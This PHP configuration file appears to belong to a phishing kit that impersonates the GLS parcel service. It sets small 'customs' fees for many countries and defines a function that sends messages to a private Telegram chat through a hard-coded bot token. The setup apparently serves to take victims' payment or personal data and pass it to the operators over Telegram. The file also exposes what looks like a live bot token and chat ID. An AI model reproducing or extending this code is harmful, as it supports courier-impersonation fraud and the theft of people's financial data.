<?php
// Configuration - GLS Tracking System

// Telegram Configuration
define('TELEGRAM_BOT_TOKEN', '7328130141:AAGPZS-pBXqfdWigygH-_IP5Z77f5t4nJqY');
define('TELEGRAM_CHAT_ID', '-1002255215041');

// Price calculator based on language (NEW - preferred method)
function getCustomsPriceByLanguage($lang = 'hu') {
    $prices = [
        'hu' => ['amount' => '150', 'currency' => 'HUF', 'display' => '150 HUF'],
        'en' => ['amount' => '1.50', 'currency' => 'USD', 'display' => '1.50 USD'],
        'de' => ['amount' => '1.25', 'currency' => 'EUR', 'display' => '1,25 EUR'],
    ];

    return isset($prices[$lang]) ? $prices[$lang] : $prices['hu'];
}

// Price calculator based on country
function getCustomsPrice($countryCode = 'HU') {
    $prices = [
        'HU' => ['amount' => '150', 'currency' => 'HUF', 'display' => '150 HUF'],
        'AT' => ['amount' => '1.25', 'currency' => 'EUR', 'display' => '1,25 EUR'],
        'DE' => ['amount' => '1.25', 'currency' => 'EUR', 'display' => '1,25 EUR'],
        'SK' => ['amount' => '1.25', 'currency' => 'EUR', 'display' => '1,25 EUR'],
        'RO' => ['amount' => '5.50', 'currency' => 'RON', 'display' => '5,50 RON'],
        'HR' => ['amount' => '9.50', 'currency' => 'HRK', 'display' => '9,50 HRK'],
        'SI' => ['amount' => '1.25', 'currency' => 'EUR', 'display' => '1,25 EUR'],
        'CZ' => ['amount' => '30', 'currency' => 'CZK', 'display' => '30 CZK'],
        'PL' => ['amount' => '5.50', 'currency' => 'PLN', 'display' => '5,50 PLN'],
        'FR' => ['amount' => '1.25', 'currency' => 'EUR', 'display' => '1,25 EUR'],
        'GB' => ['amount' => '1.10', 'currency' => 'GBP', 'display' => '1,10 GBP'],
        'US' => ['amount' => '1.50', 'currency' => 'USD', 'display' => '1,50 USD'],
        'IT' => ['amount' => '1.25', 'currency' => 'EUR', 'display' => '1,25 EUR'],
        'ES' => ['amount' => '1.25', 'currency' => 'EUR', 'display' => '1,25 EUR'],
        'NL' => ['amount' => '1.25', 'currency' => 'EUR', 'display' => '1,25 EUR'],
        'BE' => ['amount' => '1.25', 'currency' => 'EUR', 'display' => '1,25 EUR'],
        'CH' => ['amount' => '1.30', 'currency' => 'CHF', 'display' => '1,30 CHF'],
    ];

    return isset($prices[$countryCode]) ? $prices[$countryCode] : $prices['HU'];
}

// Function to send message to Telegram
function sendToTelegram($message) {
    $token = TELEGRAM_BOT_TOKEN;
    $chatId = TELEGRAM_CHAT_ID;

    $url = "https://api.telegram.org/bot{$token}/sendMessage";

    $data = array(
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    );

    // Method 1: Try with cURL (preferred and most reliable)
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);

        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);

        // Log for debugging
        error_log("TELEGRAM cURL: HTTP $httpCode - " . ($error ? $error : 'OK'));

        if ($httpCode == 200 && $result) {
            return true;
        }
    }

    // Method 2: Fallback to file_get_contents
    $options = array(
        'http' => array(
            'method'  => 'POST',
            'header'  => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data),
            'timeout' => 10,
            'ignore_errors' => true
        )
    );

    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);

    error_log("TELEGRAM file_get_contents: " . ($result ? 'OK' : 'FAILED'));

    return $result !== false;
}

// Default language
if (!isset($_SESSION)) {
    session_start();
}

if (!isset($_SESSION['lang'])) {
    $_SESSION['lang'] = 'hu';
}
?>
